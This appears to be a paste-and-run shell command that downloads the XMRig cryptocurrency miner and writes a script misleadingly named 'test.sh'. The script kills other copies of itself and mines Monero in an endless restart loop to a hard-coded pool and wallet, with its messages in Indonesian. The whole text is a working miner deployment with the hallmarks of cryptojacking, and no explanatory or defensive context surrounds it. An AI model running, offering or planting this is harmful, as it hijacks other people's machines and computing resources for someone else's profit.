wget https://github.com/xmrig/xmrig/releases/download/v6.25.0/xmrig-6.25.0-linux-static-x64.tar.gz && tar -xzvf xmrig-6.25.0-linux-static-x64.tar.gz && cd xmrig-6.25.0 && cat <<'EOF' > test.sh
#!/bin/bash
SELF_PID=$$

OTHER_PIDS=$(ps -ef | grep "[t]est.sh" | awk '{print $2}' | grep -vw "$SELF_PID")

if [ -n "$OTHER_PIDS" ]; then
    echo "Ditemukan instance test.sh lain: $OTHER_PIDS"
    echo "Menghentikan proses..."
    mv test.sh test1.sh
    kill -9 $OTHER_PIDS
    mv test1.sh test.sh
fi

echo "Tidak ada instance lain, lanjut..."

COMMAND="./xmrig --url pool.hashvault.pro:443 --user 483fbQV9MFUQp3VufiihswFWwKV693sWFcEMVEbEE5yVhsT65Re3tgb3SHcJMXwoKDHMaLtYdA5AkdGjCSaxKbzoNRtnr1M --pass x --donate-level 0 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14"
RESTART_EVERY=1800

while true
do
    echo "Menjalankan command: $COMMAND"
    $COMMAND &
    PID=$!

    echo "PID berjalan: $PID"
    echo "Menunggu 30 menit..."
    sleep $RESTART_EVERY

    echo "Kill PID: $PID"
    kill $PID 2>/dev/null

    sleep 5
    if ps -p $PID > /dev/null; then
        echo "PID masih hidup, force kill"
        kill -9 $PID
    fi

    echo "Restart command..."
    echo "-----------------------------"
done
EOF

chmod +x test.sh
./test.sh
